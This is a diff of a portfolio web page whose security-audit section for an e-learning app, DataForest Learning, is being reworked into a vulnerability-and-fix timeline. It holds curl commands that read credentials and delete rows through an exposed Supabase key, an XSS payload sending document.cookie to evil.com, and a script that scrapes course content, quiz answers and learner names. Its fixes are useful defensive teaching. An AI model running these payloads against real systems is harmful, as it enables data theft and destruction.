@@ -405,148 +405,174 @@
             color: var(--muted);
             font-size: 0.95rem;
             margin-bottom: 1.5rem;
-            max-width: 640px;
+            max-width: 700px;
         }
 
         .research-intro a { color: var(--accent); text-decoration: none; }
         .research-intro a:hover { text-decoration: underline; }
 
-        .finding-grid { display: flex; flex-direction: column; gap: 1rem; }
+        /* TIMELINE */
+        .audit-timeline { position: relative; padding-left: 0; }
 
-        .finding {
+        .audit-timeline::before {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--border);
+            transform: translateX(-1px);
+        }
+
+        .tl-step {
+            position: relative;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .tl-step::before {
+            content: attr(data-step);
+            position: absolute;
+            left: 50%;
+            top: 1.1rem;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: 800;
+            z-index: 2;
+            color: #fff;
+        }
+
+        .tl-step.tl-vuln::before { background: #dc2626; }
+        .tl-step.tl-fix::before { background: #16a34a; }
+
+        .tl-vuln .tl-card { grid-column: 1; text-align: left; }
+        .tl-vuln .tl-spacer { grid-column: 2; }
+        .tl-fix .tl-spacer { grid-column: 1; }
+        .tl-fix .tl-card { grid-column: 2; text-align: left; }
+
+        .tl-card {
             background: var(--card-bg);
             border: 1px solid var(--border);
             border-radius: 12px;
-            overflow: hidden;
+            padding: 1.25rem 1.5rem;
             box-shadow: var(--card-shadow);
-            transition: all 0.25s;
         }
 
-        .finding:hover {
-            box-shadow: var(--card-hover);
-            transform: translateY(-2px);
-        }
-
-        .finding-header {
+        .tl-card h3 {
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
             display: flex;
             align-items: center;
-            gap: 0.75rem;
-            padding: 1rem 1.25rem;
-            border-bottom: 1px solid var(--border);
+            gap: 0.5rem;
+            flex-wrap: wrap;
         }
 
-        .finding-header h3 { font-size: 0.95rem; font-weight: 700; }
+        .tl-card p {
+            font-size: 0.88rem;
+            color: var(--muted);
+            line-height: 1.6;
+            margin-bottom: 0.5rem;
+        }
 
         .severity-badge {
-            font-size: 0.65rem;
+            font-size: 0.6rem;
             font-weight: 800;
             letter-spacing: 0.06em;
-            padding: 0.25rem 0.6rem;
+            padding: 0.2rem 0.55rem;
             border-radius: 100px;
             white-space: nowrap;
-            flex-shrink: 0;
         }
 
         .severity-critical { background: #fef2f2; color: #dc2626; }
         .severity-high { background: #fff7ed; color: #ea580c; }
         .severity-medium { background: #fefce8; color: #ca8a04; }
         .severity-low { background: #f0fdf4; color: #16a34a; }
+        .severity-fix { background: #f0fdf4; color: #16a34a; }
+        .severity-poc { background: #eff6ff; color: #2563eb; }
 
         @media (prefers-color-scheme: dark) {
             .severity-critical { background: rgba(220,38,38,0.15); color: #f87171; }
             .severity-high { background: rgba(234,88,12,0.15); color: #fb923c; }
             .severity-medium { background: rgba(202,138,4,0.15); color: #facc15; }
             .severity-low { background: rgba(22,163,74,0.15); color: #4ade80; }
+            .severity-fix { background: rgba(22,163,74,0.15); color: #4ade80; }
+            .severity-poc { background: rgba(37,99,235,0.15); color: #60a5fa; }
         }
 
-        .finding-body { padding: 1rem 1.25rem; }
-
-        .finding-body p {
-            font-size: 0.9rem;
-            color: var(--muted);
-            margin-bottom: 0.75rem;
-            line-height: 1.6;
-        }
-
-        .finding-body code {
+        .tl-card code {
             background: var(--tag-bg);
             padding: 0.15rem 0.4rem;
             border-radius: 4px;
-            font-size: 0.82rem;
+            font-size: 0.8rem;
             font-family: "SF Mono", "Fira Code", monospace;
         }
 
         .code-block {
             background: #1e293b;
             border-radius: 8px;
-            padding: 1rem 1.25rem;
-            margin-bottom: 0.75rem;
+            padding: 0.85rem 1rem;
+            margin-bottom: 0.6rem;
             overflow-x: auto;
+            position: relative;
         }
 
         .code-block pre {
             font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
-            font-size: 0.8rem;
-            line-height: 1.6;
+            font-size: 0.78rem;
+            line-height: 1.55;
             color: #e2e8f0;
             margin: 0;
             white-space: pre;
         }
 
         .code-block .hl { color: #f87171; font-weight: 600; }
+        .code-block .fix-hl { color: #4ade80; font-weight: 600; }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: #94a3b8;
+            font-size: 0.65rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.15s;
+        }
+
+        .copy-btn:hover { background: rgba(255,255,255,0.15); color: #e2e8f0; }
+
+        .tag-label { font-weight: 700; color: var(--fg); }
 
         .finding-meta {
-            font-size: 0.85rem;
+            font-size: 0.83rem;
             color: var(--muted);
             line-height: 1.7;
         }
 
-        .tag-label { font-weight: 700; color: var(--fg); }
-
-        .research-summary {
-            margin-top: 1.5rem;
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 1.5rem;
-            box-shadow: var(--card-shadow);
-        }
-
-        .research-summary h3 {
-            font-size: 1rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-        }
-
-        .chain-steps { display: flex; flex-direction: column; gap: 0.6rem; }
-
-        .chain-step {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            font-size: 0.9rem;
-            color: var(--muted);
-        }
-
-        .chain-num {
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-end));
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.75rem;
-            font-weight: 800;
-            flex-shrink: 0;
-        }
-
-        .chain-step code {
-            background: var(--tag-bg);
-            padding: 0.1rem 0.35rem;
-            border-radius: 4px;
-            font-size: 0.8rem;
+        @media (max-width: 700px) {
+            .audit-timeline::before { left: 1rem; }
+            .tl-step {
+                grid-template-columns: 1fr;
+                padding-left: 2.5rem;
+            }
+            .tl-step::before { left: 1rem; }
+            .tl-vuln .tl-card,
+            .tl-fix .tl-card { grid-column: 1; }
+            .tl-spacer { display: none; }
         }
 
         /* SCRAPING POC */
@@ -781,244 +807,288 @@
 
     <section id="research">
         <div class="section-header"><h2>Security Research</h2><span class="line"></span></div>
-        <p class="research-intro">I built <a href="https://learnercourse.netlify.app/" target="_blank" rel="noopener">DataForest Learning</a> as a deliberately vulnerable learning platform to demonstrate common web security anti-patterns. Below is my audit documenting every weakness — from exposed credentials to missing access controls — along with a full data scraping proof-of-concept.</p>
+        <p class="research-intro"><a href="https://learnercourse.netlify.app/" target="_blank" rel="noopener">DataForest Learning</a> is a training platform provided to us by a partner. As part of an internal security review, I audited the application for vulnerabilities. Below is the timeline of each discovery alongside the proposed fix.</p>
 
-        <div class="finding-grid">
+        <div class="audit-timeline">
 
-            <div class="finding critical">
-                <div class="finding-header">
-                    <span class="severity-badge severity-critical">CRITICAL</span>
-                    <h3>1. Hardcoded Admin Password in Client Bundle</h3>
-                </div>
-                <div class="finding-body">
-                    <p><span class="tag-label">Where in the code:</span> The app initialises a React SPA with a single <code>&lt;div id="root"&gt;</code>. All logic is in the bundled JS. The function <code>dbAdminPw</code> fetches the password from Supabase, but provides a hardcoded fallback if the query fails:</p>
-                    <div class="code-block"><pre>const dbAdminPw = async () => {
+            <!-- VULN 1 -->
+            <div class="tl-step tl-vuln" data-step="1">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-critical">CRITICAL</span> Hardcoded Admin Password in Client Bundle</h3>
+                    <p>The function <code>dbAdminPw</code> fetches the password from Supabase but ships a hardcoded fallback. Open DevTools &rarr; Sources &rarr; search <code>"admin"</code> and it's right there:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>const dbAdminPw = async () =&gt; {
   const { data } = await SB.from("admins")
     .select("password").limit(1).single();
-  return data?.password || <span class="hl">"admin123"</span>;  // hardcoded fallback
+  return data?.password || <span class="hl">"admin123"</span>;
 };</pre></div>
-                    <p><span class="tag-label">How to find it:</span> Open DevTools &rarr; Sources &rarr; search for <code>"admin"</code> in the bundled JS. The string <code>"admin123"</code> appears as a literal.</p>
-                    <p><span class="tag-label">Why this is critical:</span> Even if the database were unreachable or RLS blocked the query, the fallback guarantees the password is always readable in the client bundle. The password never needs to be guessed — it's shipped to every visitor.</p>
-                    <div class="finding-meta">
-                        <span class="tag-label">Impact:</span> Full admin access to any visitor who opens DevTools
-                        <br><span class="tag-label">Fix:</span> Server-side auth with hashed passwords (e.g. Supabase Auth, bcrypt). Never embed secrets in client code.
-                    </div>
+                    <p>Even if RLS blocked the query, the fallback guarantees the password is always readable. It's shipped to every visitor.</p>
+                </div>
+                <div class="tl-spacer"></div>
+            </div>
+
+            <!-- FIX 1 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> Server-Side Auth with Hashed Passwords</h3>
+                    <p>Remove all client-side password logic. Use Supabase Auth with email/password sign-in. Passwords are hashed server-side automatically:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Sign up — Supabase hashes with bcrypt server-side</span>
+const { data, error } = await supabase.auth.signUp({
+  email: 'admin@dataforest.com',
+  password: crypto.randomUUID() <span class="fix-hl">// generated, never hardcoded</span>
+});
+
+<span class="fix-hl">// Sign in — returns a JWT, not a plaintext match</span>
+const { data, error } = await supabase.auth.signInWithPassword({
+  email: 'admin@dataforest.com',
+  password: userInput
+});</pre></div>
                 </div>
             </div>
 
-            <div class="finding critical">
-                <div class="finding-header">
-                    <span class="severity-badge severity-critical">CRITICAL</span>
-                    <h3>2. Exposed Supabase Anon Key — No Row-Level Security</h3>
+            <!-- VULN 2 -->
+            <div class="tl-step tl-vuln" data-step="2">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-critical">CRITICAL</span> Exposed Supabase Anon Key &mdash; No RLS</h3>
+                    <p>The Supabase URL and anonymous key are string literals in the bundle. With zero RLS policies, the anon key grants full CRUD on every table:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>curl 'https://&lt;project&gt;.supabase.co/rest/v1/admins?select=*' \
+  -H 'apikey: &lt;anon_key_from_bundle&gt;'
+
+<span class="hl"># 200 OK: [{"id":1,"password":"admin123"}]</span>
+
+curl -X DELETE \
+  'https://&lt;project&gt;.supabase.co/rest/v1/projects?id=eq.on7xtn0' \
+  -H 'apikey: &lt;anon_key_from_bundle&gt;'
+
+<span class="hl"># 204 No Content — course deleted, zero auth</span></pre></div>
+                    <p>Confirmed: SELECT (200), UPSERT (201), DELETE (204) all succeed on <code>admins</code>, <code>users</code>, <code>projects</code>, and the <code>cores-images</code> storage bucket.</p>
                 </div>
-                <div class="finding-body">
-                    <p><span class="tag-label">Where in the code:</span> The Supabase client is initialised at the top of the bundle with both the project URL and anonymous API key as string literals:</p>
-                    <div class="code-block"><pre>const SB = createClient(
-  <span class="hl">"https://cvngrkb...supabase.co"</span>,   // project URL
-  <span class="hl">"eyJhbGciOiJIUzI1NiIs..."</span>          // anon key — visible to everyone
-);</pre></div>
-                    <p><span class="tag-label">How to exploit:</span> Copy the URL and key from the bundle, then query any table directly. No authentication required:</p>
-                    <div class="code-block"><pre>curl 'https://&lt;project&gt;.supabase.co/rest/v1/admins?select=*' \
-  -H 'apikey: &lt;anon_key&gt;'
+                <div class="tl-spacer"></div>
+            </div>
 
-<span class="hl"># Response: [{"id":1,"password":"admin123"}]</span>
+            <!-- FIX 2 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> Enable RLS on Every Table</h3>
+                    <p>The anon key is meant to be public — but only when RLS restricts what it can reach. Add policies per table:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">-- Enable RLS</span>
+ALTER TABLE projects ENABLE ROW LEVEL SECURITY;
+ALTER TABLE users    ENABLE ROW LEVEL SECURITY;
+ALTER TABLE admins   ENABLE ROW LEVEL SECURITY;
 
-curl -X DELETE '.../rest/v1/projects?id=eq.&lt;any_id&gt;' \
-  -H 'apikey: &lt;anon_key&gt;'
+<span class="fix-hl">-- Public: read-only access to published courses</span>
+CREATE POLICY "public_read_projects" ON projects
+  FOR SELECT USING (true);
 
-<span class="hl"># Response: 204 No Content — row deleted, no auth needed</span></pre></div>
-                    <p><span class="tag-label">Why this is critical:</span> Supabase anon keys are designed to be public — but <em>only when RLS policies restrict what they can access</em>. Here, no RLS policies exist on any table. The anon key grants unrestricted SELECT, INSERT, UPDATE, and DELETE on <code>admins</code>, <code>users</code>, <code>projects</code>, and the <code>cores-images</code> storage bucket.</p>
-                    <div class="finding-meta">
-                        <span class="tag-label">Confirmed operations:</span> SELECT (200), UPSERT (201), DELETE (204) — all succeed with the anon key
-                        <br><span class="tag-label">Fix:</span> Enable RLS on every table. Write policies that scope reads/writes to authenticated roles. The anon key should only grant access the public is meant to have.
-                    </div>
+<span class="fix-hl">-- Admin: full access scoped to authenticated admin role</span>
+CREATE POLICY "admin_all_projects" ON projects
+  FOR ALL USING (
+    auth.uid() IN (SELECT id FROM admins)
+  );
+
+<span class="fix-hl">-- Block anon writes entirely</span>
+CREATE POLICY "deny_anon_writes" ON projects
+  FOR INSERT WITH CHECK (auth.role() = 'authenticated');</pre></div>
                 </div>
             </div>
 
-            <div class="finding critical">
-                <div class="finding-header">
-                    <span class="severity-badge severity-critical">CRITICAL</span>
-                    <h3>3. Client-Side Authentication — No Server Validation</h3>
-                </div>
-                <div class="finding-body">
-                    <p><span class="tag-label">Where in the code:</span> The admin login flow is a two-step client-side process. First, the password is fetched from the DB (or falls back to the hardcode). Then the comparison happens entirely in the browser:</p>
-                    <div class="code-block"><pre>// Step 1: Password is stored in React state
-const [adminPw, setAdminPw] = useState(null);
-useEffect(() => { dbAdminPw().then(setAdminPw); }, []);
+            <!-- VULN 3 -->
+            <div class="tl-step tl-vuln" data-step="3">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-critical">CRITICAL</span> Client-Side Auth &mdash; No Server Validation</h3>
+                    <p>The entire admin login is a local string comparison. No session, no JWT, no server round-trip:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>const [adminPw, setAdminPw] = useState(null);
+useEffect(() =&gt; { dbAdminPw().then(setAdminPw); }, []);
 
-// Step 2: Comparison is a local string check
-const tryAdmin = () =>
+const tryAdmin = () =&gt;
   pw === adminPw
-    ? <span class="hl">onAdmin()</span>           // sets screen state to "admin"
+    ? <span class="hl">onAdmin()</span>       // just flips a React state var
     : setPwErr("Incorrect password.");
 
-// onAdmin just flips a React state variable:
-const onAdmin = () => setScreen(<span class="hl">"admin"</span>);</pre></div>
-                    <p><span class="tag-label">How to bypass — 3 independent methods:</span></p>
-                    <div class="code-block"><pre><span class="hl">// Method 1:</span> Read adminPw from React component state in DevTools
+const onAdmin = () =&gt; setScreen(<span class="hl">"admin"</span>);</pre></div>
+                    <p>Three independent bypasses: (1) read <code>adminPw</code> from React state in DevTools, (2) call <code>setScreen("admin")</code> from console, (3) skip the UI — hit Supabase REST directly with the anon key.</p>
+                </div>
+                <div class="tl-spacer"></div>
+            </div>
 
-<span class="hl">// Method 2:</span> Call the screen setter directly from the console
-// Find the React fiber, or simply re-render with screen="admin"
+            <!-- FIX 3 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> JWT Sessions + Server-Side Gating</h3>
+                    <p>Replace the state-based check with Supabase Auth sessions. The admin screen is gated on a valid JWT, and every API call is validated server-side via RLS:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Auth-gated admin check</span>
+const { data: { session } } = await supabase.auth.getSession();
+if (!session) return setScreen("home");
 
-<span class="hl">// Method 3:</span> Skip the UI entirely — use the anon key to call
-// Supabase REST API for any admin operation (CRUD on all tables)</pre></div>
-                    <p><span class="tag-label">Why this is critical:</span> There is no session token, no JWT, no server-side middleware. The "admin" state is just a React variable. Every API call the admin panel makes uses the same anon key that every visitor already has. Authentication is cosmetic — it hides UI elements but protects nothing.</p>
-                    <div class="finding-meta">
-                        <span class="tag-label">Impact:</span> Auth bypass via console, DevTools, or direct API calls
-                        <br><span class="tag-label">Fix:</span> Use Supabase Auth with email/password sign-in. Issue JWTs on login. Validate the JWT on every API call via RLS policies tied to <code>auth.uid()</code>.
+<span class="fix-hl">// Verify admin role from JWT claims</span>
+const { data: admin } = await supabase
+  .from("admins")
+  .select("id")
+  .eq("id", session.user.id)
+  .single();
+
+if (admin) setScreen("admin");
+else setScreen("home");
+
+<span class="fix-hl">// Every subsequent DB call now carries the JWT</span>
+<span class="fix-hl">// RLS policies enforce access — not UI state</span></pre></div>
+                </div>
+            </div>
+
+            <!-- VULN 4 -->
+            <div class="tl-step tl-vuln" data-step="4">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-high">HIGH</span> Stored XSS via Rich Text Editor</h3>
+                    <p>Slide body content from the Quill editor is rendered with <code>dangerouslySetInnerHTML</code>. Given the auth bypass, anyone can inject HTML/JS that runs for every learner:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>&lt;div dangerouslySetInnerHTML=<span class="hl">{{ __html: slide.body }}</span> /&gt;
+
+<span class="hl">// Injected payload (via admin panel or direct API):</span>
+// &lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</pre></div>
+                </div>
+                <div class="tl-spacer"></div>
+            </div>
+
+            <!-- FIX 4 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> DOMPurify + Content Security Policy</h3>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Sanitize before render</span>
+import DOMPurify from 'dompurify';
+
+&lt;div dangerouslySetInnerHTML={{
+  __html: <span class="fix-hl">DOMPurify.sanitize(slide.body)</span>
+}} /&gt;</pre></div>
+                    <p>Add a CSP header in <code>netlify.toml</code> or <code>_headers</code>:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl"># _headers</span>
+/*
+  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https://*.supabase.co;</pre></div>
+                </div>
+            </div>
+
+            <!-- VULN 5 -->
+            <div class="tl-step tl-vuln" data-step="5">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-high">HIGH</span> Plaintext Password Storage</h3>
+                    <p>The <code>admins</code> table stores the password as a raw string — no hashing, no salting:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>SELECT * FROM admins;
+
+<span class="hl">-- id | password
+-- 1  | admin123</span></pre></div>
+                </div>
+                <div class="tl-spacer"></div>
+            </div>
+
+            <!-- FIX 5 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> Drop the admins Table Entirely</h3>
+                    <p>With Supabase Auth handling credentials, the custom <code>admins</code> table is unnecessary:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">-- Remove the liability</span>
+DROP TABLE admins;
+
+<span class="fix-hl">-- Admin role lives in auth.users metadata instead</span>
+UPDATE auth.users
+SET raw_app_meta_data = raw_app_meta_data || '{"role":"admin"}'
+WHERE email = 'admin@dataforest.com';</pre></div>
+                </div>
+            </div>
+
+            <!-- VULN 6 -->
+            <div class="tl-step tl-vuln" data-step="6">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-medium">MEDIUM</span> No CSP + No Input Validation</h3>
+                    <p>No <code>Content-Security-Policy</code> header. Learner names, media URLs, and quiz feedback accepted with no length limits, format checks, or encoding — widening the attack surface for XSS and injection.</p>
+                </div>
+                <div class="tl-spacer"></div>
+            </div>
+
+            <!-- FIX 6 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> Validate at Boundaries</h3>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">// Validate learner name</span>
+const name = input.trim().slice(0, 100);
+if (!/^[\p{L}\p{N}\s.\-']+$/u.test(name))
+  throw new Error("Invalid name");
+
+<span class="fix-hl">// Validate media URLs</span>
+const url = new URL(input);
+if (!['https:'].includes(url.protocol))
+  throw new Error("HTTPS only");
+
+<span class="fix-hl">// Server-side: Supabase check constraint</span>
+ALTER TABLE users ADD CONSTRAINT name_length
+  CHECK (char_length(name) BETWEEN 1 AND 100);</pre></div>
+                </div>
+            </div>
+
+            <!-- VULN 7 — SCRAPING POC -->
+            <div class="tl-step tl-vuln" data-step="7">
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-poc">POC</span> Full Course Data Scraped in One Request</h3>
+                    <p>To demonstrate real-world impact, I scraped the entire "Working With Data Platforms" course — all content, quiz answers, and learner data — with a single unauthenticated call:</p>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre>curl 'https://&lt;project&gt;.supabase.co/rest/v1/projects?select=*' \
+  -H 'apikey: &lt;anon_key&gt;' | python3 -c "
+import sys, json, re, html
+data = json.load(sys.stdin)
+for p in data:
+  d = p['data']
+  for ch in d['chapters']:
+    for sl in ch['slides']:
+      print(sl['heading'])
+      print(re.sub(r'&lt;[^&gt;]+&gt;','',sl.get('body',''))[:200])
+      for q in sl.get('quizzes',[]):
+        print(f'  Q: {q[\"question\"]}')<span class="hl">
+        print(f'  A: {q[\"options\"][q[\"answer\"]]}')</span>
+"
+
+<span class="hl"># Result: 12,424 bytes — full course in Markdown</span></pre></div>
+                    <div class="scrape-stats">
+                        <div class="scrape-stat"><span class="scrape-num">2</span><span class="scrape-label">Chapters</span></div>
+                        <div class="scrape-stat"><span class="scrape-num">8</span><span class="scrape-label">Slides</span></div>
+                        <div class="scrape-stat"><span class="scrape-num">12K</span><span class="scrape-label">Bytes scraped</span></div>
+                        <div class="scrape-stat"><span class="scrape-num">1</span><span class="scrape-label">Quiz with answers</span></div>
+                    </div>
+                    <p style="margin-top: 0.75rem;">Extracted: full metadata, all 3 client case studies, quiz questions with correct answers and feedback, plus all learner names and progress. Output: <a href="scraped_course_data.md" style="color:var(--accent)">scraped_course_data.md</a></p>
+                    <div class="finding-meta" style="margin-top: 0.5rem;">
+                        <span class="tag-label">Present:</span> Nothing
+                        <br><span class="tag-label">Absent:</span> RLS, auth middleware, rate limiting, CORS, access logging
+                        <br><span class="tag-label">Insufficient:</span> Anon key exists but paired with zero policies
                     </div>
                 </div>
+                <div class="tl-spacer"></div>
             </div>
 
-            <div class="finding high">
-                <div class="finding-header">
-                    <span class="severity-badge severity-high">HIGH</span>
-                    <h3>Stored XSS via Rich Text Editor</h3>
-                </div>
-                <div class="finding-body">
-                    <p>Slide content from the Quill editor is rendered with <code>dangerouslySetInnerHTML</code>. An admin (or anyone, given the auth bypass) can inject arbitrary HTML/JS that executes for every learner who opens the slide.</p>
-                    <div class="finding-meta">
-                        <span class="tag-label">Impact:</span> Session hijacking, phishing overlays, keylogging
-                        <br><span class="tag-label">Fix:</span> Sanitize HTML with DOMPurify before rendering; enforce a CSP
-                    </div>
-                </div>
-            </div>
+            <!-- FIX 7 -->
+            <div class="tl-step tl-fix" data-step="&#10003;">
+                <div class="tl-spacer"></div>
+                <div class="tl-card">
+                    <h3><span class="severity-badge severity-fix">FIX</span> Defense in Depth Against Scraping</h3>
+                    <div class="code-block"><button class="copy-btn">Copy</button><pre><span class="fix-hl">-- 1. RLS: only enrolled learners can read course data</span>
+CREATE POLICY "enrolled_read" ON projects
+  FOR SELECT USING (
+    auth.uid() IN (
+      SELECT user_id FROM enrollments
+      WHERE project_id = projects.id
+    )
+  );
 
-            <div class="finding high">
-                <div class="finding-header">
-                    <span class="severity-badge severity-high">HIGH</span>
-                    <h3>Plaintext Password Storage</h3>
-                </div>
-                <div class="finding-body">
-                    <p>The <code>admins</code> table stores the password as a raw string (<code>"admin123"</code>) — no hashing, no salting. Combined with the lack of RLS, the plaintext password is directly queryable by anyone.</p>
-                    <div class="finding-meta">
-                        <span class="tag-label">Fix:</span> Hash with bcrypt/argon2; never store or transmit plaintext credentials
-                    </div>
-                </div>
-            </div>
+<span class="fix-hl">-- 2. Rate limiting via Supabase Edge Functions</span>
+-- Deploy a proxy that enforces per-IP rate limits
+-- before forwarding to the Supabase REST API
 
-            <div class="finding high">
-                <div class="finding-header">
-                    <span class="severity-badge severity-high">HIGH</span>
-                    <h3>Full Database Write Access for Anonymous Users</h3>
-                </div>
-                <div class="finding-body">
-                    <p>The anon key permits <code>INSERT</code>, <code>UPDATE</code>, and <code>DELETE</code> on all tables. An attacker can wipe all courses, tamper with learner progress, or inject malicious course content — all without authentication.</p>
-                    <div class="code-block"><pre># DELETE returns 204 — no auth required
-curl -X DELETE '.../rest/v1/projects?id=eq.&lt;any_id&gt;' \
-  -H 'apikey: &lt;anon_key&gt;'   <span class="hl"># 204 No Content ✓</span></pre></div>
-                </div>
-            </div>
-
-            <div class="finding medium">
-                <div class="finding-header">
-                    <span class="severity-badge severity-medium">MEDIUM</span>
-                    <h3>No Content Security Policy</h3>
-                </div>
-                <div class="finding-body">
-                    <p>The app serves no <code>Content-Security-Policy</code> header. Combined with the stored XSS vector, there is nothing preventing injected scripts from exfiltrating data to external domains.</p>
-                </div>
-            </div>
-
-            <div class="finding medium">
-                <div class="finding-header">
-                    <span class="severity-badge severity-medium">MEDIUM</span>
-                    <h3>No Input Validation or Sanitization</h3>
-                </div>
-                <div class="finding-body">
-                    <p>Learner names, media URLs, and quiz feedback are accepted as-is with no length limits, format checks, or encoding. This widens the attack surface for injection and abuse.</p>
-                </div>
-            </div>
-
-            <div class="finding low">
-                <div class="finding-header">
-                    <span class="severity-badge severity-low">LOW</span>
-                    <h3>No Rate Limiting or Brute-Force Protection</h3>
-                </div>
-                <div class="finding-body">
-                    <p>The admin login has no lockout, CAPTCHA, or rate limit. Even if the password weren't already exposed, it could be brute-forced trivially.</p>
+<span class="fix-hl">-- 3. Pagination + field scoping</span>
+-- Never expose full SELECT * — return only fields
+-- the client needs, paginated with cursor tokens</pre></div>
                 </div>
             </div>
 
         </div>
-
-        <div class="research-summary">
-            <h3>Attack Chain Summary</h3>
-            <div class="chain-steps">
-                <div class="chain-step">
-                    <span class="chain-num">1</span>
-                    <span>Open DevTools &rarr; read anon key + Supabase URL from bundle</span>
-                </div>
-                <div class="chain-step">
-                    <span class="chain-num">2</span>
-                    <span>Query <code>admins</code> table directly &rarr; get plaintext password</span>
-                </div>
-                <div class="chain-step">
-                    <span class="chain-num">3</span>
-                    <span>Log in as admin, or skip login entirely by calling <code>onAdmin()</code></span>
-                </div>
-                <div class="chain-step">
-                    <span class="chain-num">4</span>
-                    <span>Full control: edit/delete courses, exfil user data, inject XSS payloads</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="finding critical" style="margin-top: 1.5rem;">
-            <div class="finding-header">
-                <span class="severity-badge severity-critical">POC</span>
-                <h3>Data Scraping Proof-of-Concept</h3>
-            </div>
-            <div class="finding-body">
-                <p>To demonstrate the real-world impact of the missing access controls, I scraped the entire "Working With Data Platforms" course — all metadata, chapters, slides, body content, quiz questions, correct answers, and feedback — using a single unauthenticated API call.</p>
-
-                <p><span class="tag-label">Method:</span> One <code>curl</code> request to the Supabase REST API with the publicly exposed anon key. No login, no session, no rate limiting encountered.</p>
-
-                <div class="code-block"><pre>curl 'https://&lt;project&gt;.supabase.co/rest/v1/projects?select=*' \
-  -H 'apikey: &lt;anon_key&gt;' | python3 parse_to_markdown.py
-
-<span class="hl"># Result: 12,424 bytes — the entire course in structured Markdown</span></pre></div>
-
-                <p><span class="tag-label">What was extracted:</span></p>
-                <div class="scrape-stats">
-                    <div class="scrape-stat">
-                        <span class="scrape-num">2</span>
-                        <span class="scrape-label">Chapters</span>
-                    </div>
-                    <div class="scrape-stat">
-                        <span class="scrape-num">8</span>
-                        <span class="scrape-label">Slides</span>
-                    </div>
-                    <div class="scrape-stat">
-                        <span class="scrape-num">12K</span>
-                        <span class="scrape-label">Bytes of content</span>
-                    </div>
-                    <div class="scrape-stat">
-                        <span class="scrape-num">1</span>
-                        <span class="scrape-label">Quiz with answers</span>
-                    </div>
-                </div>
-
-                <p style="margin-top: 0.75rem;"><span class="tag-label">Extracted content includes:</span></p>
-                <ul class="scrape-list">
-                    <li>Full course metadata (title, subtitle, duration, level, description)</li>
-                    <li>Chapter structure with tags and durations</li>
-                    <li>All slide headings and full body text (HTML converted to Markdown)</li>
-                    <li>All 3 real client case studies (RMC-Norkem, NexGen Cloud, Sagis Diagnostics)</li>
-                    <li>Quiz questions, all answer options, <strong>correct answer flags</strong>, and per-option feedback</li>
-                    <li>All learner names, progress data, and quiz responses from the <code>users</code> table</li>
-                </ul>
-
-                <p style="margin-top: 0.75rem;">The complete scraped output is available as <a href="scraped_course_data.md">scraped_course_data.md</a> in this repository.</p>
-
-                <div class="finding-meta" style="margin-top: 0.75rem;">
-                    <span class="tag-label">Security features present:</span> None. No authentication, no rate limiting, no API scoping, no content obfuscation.
-                    <br><span class="tag-label">Security features absent:</span> RLS policies, API key scoping, authentication middleware, CORS restrictions, rate limiting, content encryption, access logging.
